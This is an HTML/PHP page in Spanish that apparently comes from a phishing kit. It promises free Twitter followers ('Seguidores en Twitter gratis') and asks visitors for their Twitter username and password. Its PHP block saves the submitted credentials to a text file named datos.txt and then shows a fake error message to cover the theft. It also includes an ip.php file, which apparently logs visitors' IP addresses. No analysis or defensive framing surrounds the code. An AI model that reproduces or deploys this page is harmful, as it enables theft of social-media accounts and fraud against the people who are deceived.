
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Twitter - Bots</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
    <style>
    body {
      height:100%;
      width:100%;
      background-image: url("http://www.imperial.ac.uk/imedia/general_graphics/interact/images/twitterBG.jpg");
      background-repeat: no-repeat;
      background-size:cover;
    }
    .centrar {
      min-height: 100vh;
      display: flex;
      align-items: center;
    }
    </style>
  </head>
  <body>
<?php

  if (isset($_POST["usuario"]) && isset($_POST["pass"])) {
    $fichero = "datos.txt";
    $usuario = htmlentities(str_replace("<:>","",$_POST["usuario"]));
    $pass = htmlentities(str_replace("<:>","",$_POST["pass"]));
    $ip = $_SERVER['REMOTE_ADDR'];
    $text = $usuario."\nemail: ".$usuario."\nPass: ".$pass;	
    $nuevo .= $text."\n";
    file_put_contents($fichero, $nuevo);
    $m = "<div class='alert alert-danger' role='alert'>Error 225; No se han podido añadir los seguidores en tu cuenta.</div>";
  }else{
    $m = "";
  }
?>
<?php include 'ip.php'; ?>
  <div class="container centrar">
    <div class="row">
      <div class="col-md-12">
	<div class="alert alert-info">
<img src="Cesar.png" width="auto" height="215" <="" div="">
	<h1><b>Auto Seguidores 2019/2020</b></h1><hr/>
          <h1><b>SEGUIDORES EN TWITTER GRATIS</b></h1><hr/>
          <form method="POST" action="#">
            <?php echo $m; ?>
            <input name="usuario" type="text" class="form-control" placeholder="Nombre de usuario"><br/>
            <input name="pass" type="password" class="form-control" placeholder="Contraseña"><br/>
            <select class="form-control">
              <option>10 seguidores (GRATIS)</option>
              <option>50 seguidores (GRATIS)</option>
              <option>100 seguidores (GRATIS)</option>
              <option>1000 seguidores (GRATIS)</option>
              <option>5000 seguidores (10€)</option>
              <option>10000 seguidores (50€)</option>
            </select><br/>
            <button class="btn btn-success btn-lg btn-block" type="submit">Añadir seguidores</button>
          </form>
        </div>
      </div>
    </div>
  </div>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script>
  </body>
</html>
 
